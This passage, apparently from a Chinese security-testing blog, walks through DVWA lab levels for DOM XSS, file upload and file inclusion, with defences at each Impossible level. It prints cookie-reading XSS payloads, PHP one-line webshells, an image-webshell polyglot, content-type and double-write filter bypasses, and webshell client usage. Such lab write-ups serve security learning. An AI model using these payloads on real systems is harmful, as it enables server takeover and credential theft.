<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>从以下我们可以知道,存储型的XSS危害最大。因为他存储在服务器端,所以不需要我们和被攻击者有任何接触, 只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL, 需要我们和用户有直接或者间接的接触,比如利用社会工程学或者利用在其他网页挂马的方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">							|---&gt;窃取cookie</span><br><span class="line">						|---&gt;网络钓鱼</span><br><span class="line">	|-------&gt;针对用户--&gt;|---&gt;放马挖矿	</span><br><span class="line">	|					|---&gt;广告刷流量</span><br><span class="line">XSS----|					</span><br><span class="line">	|					</span><br><span class="line">	|					|---&gt;篡改页面</span><br><span class="line">	|-----&gt;针对web服务-&gt;|---&gt;传播蠕虫</span><br><span class="line">						|---&gt;内网扫描</span><br><span class="line">						|---&gt;劫持后台</span><br><span class="line">						</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><ul>
<li><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
</li>
<li><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
</li>
</ul>
<p><strong>什么是DOM</strong></p>
<p>知道html的知识，应该都清楚什么是DOM，比如一个典型的html格式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wap&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>常见注入代码</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">hidden</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p>服务器代码</p>
<p><img src="/aposts/27850020/image-20220214103755950.png" alt="image-20220214103755950"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><strong>服务器代码</strong></p>
<ul>
<li><p>可以看到代码中没有做任何保护，而表单是让我们选择语言</p>
</li>
<li><p>点击select，可以看到?default&#x3D;English,所以可以在&#x3D;号后插入xss <strong>payload</strong></p>
</li>
</ul>
<p><img src="/aposts/27850020/image-20220214104034792.png" alt="image-20220214104034792"></p>
<p><strong>前端代码</strong></p>
<p>右键查看前端源码，发现有URI解码的函数，被前端执行</p>
<p><img src="/aposts/27850020/image-20220214151722967.png" alt="image-20220214151722967"></p>
<p><strong>POC、EXP、Payload与Shellcode</strong></p>
<blockquote>
<p>POC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
<p>EXP，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<p>Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。</p>
<p>Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p>
</blockquote>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>直接把请求参数改为：<code>default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，就获取到了cookie</p>
<p><img src="/aposts/27850020/image-20220214110216672.png" alt="image-20220214110216672"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>主要过滤了script标签</p>
<p><img src="/aposts/27850020/image-20220214104951307.png" alt="image-20220214104951307"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>直接把参数改为：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code>，这里的是为了破坏选择框的结构。</p>
<p><img src="/aposts/27850020/image-20220214110140539.png" alt="image-20220214110140539"></p>
<h2 id="安全等级High"><a href="#安全等级High" class="headerlink" title="安全等级High"></a>安全等级High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>default&#x3D;只允许是French、English、German、Spanish、这几个通过。（采用了白名单过滤）</p>
<p><img src="/aposts/27850020/image-20220214111011079.png" alt="image-20220214111011079"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>用#号绕过提交到服务器，参数改为：<code>default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
<p><img src="/aposts/27850020/image-20220214111327747.png" alt="image-20220214111327747"></p>
<h2 id="安全等级为-Impossible"><a href="#安全等级为-Impossible" class="headerlink" title="安全等级为 Impossible"></a>安全等级为 Impossible</h2><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>后台什么也不做</p>
<p><img src="/aposts/27850020/image-20220214112250124.png" alt="image-20220214112250124"></p>
<p>前端去除了URI解码的函数，默认不解码，所以无法被前端执行。</p>
<p><img src="/aposts/27850020/image-20220214152239910.png" alt="image-20220214152239910"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>利用：任何URL带参页面，都可以尝试渗透</p>
</li>
<li><p>预防：在页面跳转时，不要过分依赖URL数据，尽量通过POST重新获取数据</p>
</li>
<li><p>本文操作步骤来自<a href="https://blog.csdn.net/qqchaozai/article/details/102753847?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_default&utm_relevant_index=12">这里</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-File Upload(文件上传)</title>
    <url>/aposts/14cb0ff0/</url>
    <content><![CDATA[<h2 id="文件上传漏洞-File-Upload"><a href="#文件上传漏洞-File-Upload" class="headerlink" title="文件上传漏洞 File Upload"></a>文件上传漏洞 File Upload</h2><ul>
<li><p>⽂件上传是Web 应⽤必备功能之⼀。</p>
</li>
<li><p>如果服务器配置不当或者没有进⾏⾜够的过滤，Web ⽤户就可以上传任意⽂件，包括恶意脚本⽂件，exe 程序等等，这就造成了⽂件上传漏洞。</p>
</li>
</ul>
<h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><ul>
<li>服务器配置不当</li>
<li>Web应用开放了文件上传功能，没有对上传的文件做足够的限制和过滤。</li>
<li>在程序开发部署时，没有考虑到系统的特性或组件的漏洞，而导致限制被绕过。</li>
</ul>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul>
<li>上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本，程序等。</li>
<li>直接上传后门文件，导致网站沦陷。</li>
<li>通过恶意文件，利用其他楼栋拿到管理员权限（提权），导致服务器沦陷。</li>
<li>通过文件上传漏洞获得网站后门，叫<strong>Webshell</strong></li>
</ul>
<h2 id="安全等级LOW"><a href="#安全等级LOW" class="headerlink" title="安全等级LOW"></a>安全等级LOW</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>低难度级别可以任意文件上传没有做任何安全过滤。我们可以直接<strong>上传木马一句话</strong>，利用<strong>冰蝎</strong>连接。</p>
<p><img src="/aposts/14cb0ff0/image-20220208170803959.png" alt="image-20220208170803959"></p>
<h3 id="冰歇"><a href="#冰歇" class="headerlink" title="冰歇"></a>冰歇</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
<li>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。老牌 Webshell 管理神器——<strong>中国菜刀</strong>的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，加密 Webshell 正变得日趋流行。由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测</li>
<li>官网地址为：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></li>
<li>运行环境：<ul>
<li>客户端：jre8+</li>
<li>服务端：.net 2.0+;php 5.3-7.4;java 6+</li>
</ul>
</li>
</ul>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li>打开<a href="https://github.com/rebeyond/Behinder/releases%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81">https://github.com/rebeyond/Behinder/releases，下载源码</a></li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220208173550815.png" alt="image-20220208173550815"></p>
<ul>
<li>本地windwos启动客户端</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\exe\Behinder_v3.0_Beta_11.t00ls&gt;java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/14cb0ff0/image-20220209084403643.png" alt="image-20220209084403643"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>上传木马文件，其实就是冰蝎server中带有的shell.php文件<ul>
<li>比如<code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code>就是典型的一句话木马，这里的123为自定义密码</li>
</ul>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209090359025.png" alt="image-20220209090359025"></p>
<p><img src="/aposts/14cb0ff0/image-20220209085226115.png" alt="image-20220209085226115"></p>
<ul>
<li>查看服务器成功上传成功的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos uploads]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/hackable/uploads</span><br><span class="line">[root@VM-24-13-centos uploads]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root   root   667 Jan 26 09:38 dvwa_email.png</span><br><span class="line">-rw-r--r-- 1 apache apache 643 Feb  9 09:02 shell.php  # 这个就是刚刚上传的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>冰歇连接，注意默认密码就是rebeyond</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209090923680.png" alt="image-20220209090923680"></p>
<ul>
<li>双击刚刚新增的url，自动弹出连接成功的界面（需要等几秒钟，才会出结果）</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209091142730.png" alt="image-20220209091142730"></p>
<ul>
<li><strong>无论是执行shell命令，还是管理文件，基本上服务器行的信息全部暴露无遗</strong></li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209091417269.png" alt="image-20220209091417269"></p>
<p><img src="/aposts/14cb0ff0/image-20220209100608363.png" alt="image-20220209100608363"></p>
<h2 id="安全等级为medium"><a href="#安全等级为medium" class="headerlink" title="安全等级为medium"></a>安全等级为medium</h2><ul>
<li>直接上传木马文件shell.php，报错了</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209101333174.png" alt="image-20220209101333174"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>对文件上传类型和文件大小做了限制</p>
<p><img src="/aposts/14cb0ff0/image-20220209101149257.png" alt="image-20220209101149257"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>先把服务器上的shell.php文件删除</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos uploads]# rm shell.php</span><br><span class="line">rm: remove regular file ‘shell.php’? y</span><br><span class="line">[root@VM-24-13-centos uploads]#</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传木马shell文件</p>
<p><img src="/aposts/14cb0ff0/image-20220209103101816.png" alt="image-20220209103101816"></p>
<p>burp site 拦截上传请求</p>
<p><img src="/aposts/14cb0ff0/image-20220209103229163.png" alt="image-20220209103229163"></p>
<p>把content-type修改为image&#x2F;jpeg</p>
<p><img src="/aposts/14cb0ff0/image-20220209103347977.png" alt="image-20220209103347977"></p>
<p>点击拦截请求，把状态改为禁用</p>
<p><img src="/aposts/14cb0ff0/image-20220209103440177.png" alt="image-20220209103440177"></p>
<p><img src="/aposts/14cb0ff0/image-20220209103506461.png" alt="image-20220209103506461"></p>
<p>发现文件上传成功</p>
<p><img src="/aposts/14cb0ff0/image-20220209103525182.png" alt="image-20220209103525182"></p>
<p>服务器上查看到刚刚上传成功的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos uploads]# ls</span><br><span class="line">dvwa_email.png  shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用冰歇同样连接成功</p>
<p><img src="/aposts/14cb0ff0/image-20220209103700345.png" alt="image-20220209103700345"></p>
<h2 id="安定等级为High"><a href="#安定等级为High" class="headerlink" title="安定等级为High"></a>安定等级为High</h2><p><strong>注意，本次攻击失败，但是也把攻击步骤写下来</strong></p>
<h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><p>对文件后缀进行白名单验证，所以我们只能进行图片jpg png的上传</p>
<p><img src="/aposts/14cb0ff0/image-20220209104615758.png" alt="image-20220209104615758"></p>
<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><ul>
<li><p>菜刀和冰歇差不多的工具</p>
</li>
<li><p>现在最新的是2016的版本，这里下载：<a href="https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL">https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL</a></p>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209114037607.png" alt="image-20220209114037607"></p>
<ul>
<li>使用copy命令的方式，写一个图片木马文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209154852952.png" alt="image-20220209154852952"></p>
<ul>
<li>1.bat中的文件内容就是copy命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 3.jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>1.php中的内容，<strong>注意777是密码</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&quot;shell.php&quot;,&#x27;w&#x27;),&#x27;&lt;?=@eval($_REQUEST[777])?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行1.bat生成了3.jpg文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155219270.png" alt="image-20220209155219270"></p>
<ul>
<li>上传3.jpg文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155338946.png" alt="image-20220209155338946"></p>
<ul>
<li><p>用文件包含的方式访问刚刚上传的图片，发现了乱码</p>
<p>http:&#x2F;xx.xx.xx.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;DVWA-2.0.1&#x2F;hackable&#x2F;uploads&#x2F;3.jpg</p>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155603879.png" alt="image-20220209155603879"></p>
<ul>
<li>使用菜刀连接，发现一直无法得到webshell，最终发现原来这样访问肯定不行，<strong>因为没有登录，这样直接访问跳转到了登录界面</strong>，很多博文都是这样记录的，有点奇怪</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155804364.png" alt="image-20220209155804364"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>这里分析一下 Impossible级别的代码，对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<p><img src="/aposts/14cb0ff0/image-20220209160436185.png" alt="image-20220209160436185"></p>
<p>本文主要参考的来自<a href="https://blog.csdn.net/qq_42094992/article/details/107822876?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=3">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-File Inclusion（文件包含）</title>
    <url>/aposts/d3b7fcf8/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中(<strong>php中比较常见</strong>)，提供了：<code>require(),require_once()</code></li>
<li>这些文件包含函数，这些函数在代码设计中被经常使用到。</li>
<li>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为<strong>本地文件包含漏洞和远程文件包含漏洞</strong>。<ul>
<li><strong>本地文件包含漏洞</strong>：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</li>
<li><strong>远程文件包含漏洞</strong>：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的<strong>白名单策略进行过滤</strong>。</li>
</ul>
</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/d3b7fcf8/image-20220208151327133.png" alt="image-20220208151327133"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>先看下file1.php源代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/DVWA-<span class="number">2.0</span>.<span class="number">1</span>/vulnerabilities/fi</span><br><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># cat file1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;div class=\&quot;body_padded\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=\&quot;vulnerable_code_area\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;File 1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;hr /&gt;</span></span><br><span class="line"><span class="string">                Hello &lt;em&gt;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&lt;/em&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                Your IP address is: &lt;em&gt;<span class="subst">&#123;$_SERVER[ &#x27;REMOTE_ADDR&#x27; ]&#125;</span>&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                [&lt;em&gt;&lt;a href=\&quot;?page=include.php\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;Wikipedia - File inclusion vulnerability&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Local File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Remote File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>看下dvwa的源码，直接获取了page参数，没有任何过滤</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208151611350.png" alt="image-20220208151611350"></p>
<ul>
<li>尝试点击,发现page的值就是文件名</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208151804922.png" alt="image-20220208151804922"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行</strong>，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，<strong>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></li>
</ul>
<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><ul>
<li>将本地文件路径传给page，直接在服务器的本地路径新建一个phpinfo.txt文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos html]# pwd</span><br><span class="line">/var/www/html</span><br><span class="line">[root@VM-24-13-centos html]# vi phpinfo.txt</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos html]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问地址把page加上路径，如：<a href="http://xx.xx.xx.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt">http://XX.XX.XX.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208153727889.png" alt="image-20220208153727889"></p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><ul>
<li>本地搭建简单的http服务器，我用的python3自带的</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208155233231.png" alt="image-20220208155233231"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动http 服务器</span></span><br><span class="line">D:\book\1&gt;python -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/d3b7fcf8/image-20220208155358733.png" alt="image-20220208155358733"></p>
<ul>
<li>直接把page改为远程的路径：<a href="http://127.0.0.1/phpinfo.txt">http://127.0.0.1/phpinfo.txt</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208155438310.png" alt="image-20220208155438310"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>将 “http:&#x2F;&#x2F;“ ,”https:&#x2F;&#x2F;“ ,”..&#x2F;“ ,”..&quot;“ 替换成空，我们直接双写绕过，如：像 http:&#x2F;&#x2F; 写成 htt<a href="http://p//%EF%BC%8C">http://p://，</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208160332055.png" alt="image-20220208160332055"></p>
<ul>
<li>具体的url如下：</li>
</ul>
<p><a href="http://xxxx.xxx.xx/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt">http://XXXX.XXX.XX/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt</a></p>
<p><img src="/aposts/d3b7fcf8/image-20220208160810658.png" alt="image-20220208160810658"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>如果page 中不包含 file 并且 file 不等于 include.php，则 输出 File not found !</p>
<p><img src="/aposts/d3b7fcf8/image-20220208161716844.png" alt="image-20220208161716844"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>通过file协议实现本地文件包含:具体的url如下：</p>
<p>http:&#x2F;XX.XX.XXX.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.txt</p>
<p><img src="/aposts/d3b7fcf8/image-20220208162158052.png" alt="image-20220208162158052"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
<p><img src="/aposts/d3b7fcf8/image-20220208162426973.png" alt="image-20220208162426973"></p>
<p>本文主要来自<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-JavaScript Attacks</title>
    <url>/aposts/558de72d/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>就算js前端攻击</p>
<h2 id="安全等级Low"><a href="#安全等级Low" class="headerlink" title="安全等级Low"></a>安全等级Low</h2><p>发现输入success提交是无效的</p>
<p><img src="/aposts/558de72d/image-20220215145045285.png" alt="image-20220215145045285"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="后台代码"><a href="#后台代码" class="headerlink" title="后台代码"></a>后台代码</h4><p>文本框(phrase)输入内容，经过md5+自定义函数（rol13）转换后，最终赋值给token</p>
<p><img src="/aposts/558de72d/image-20220215150253005.png" alt="image-20220215150253005"></p>
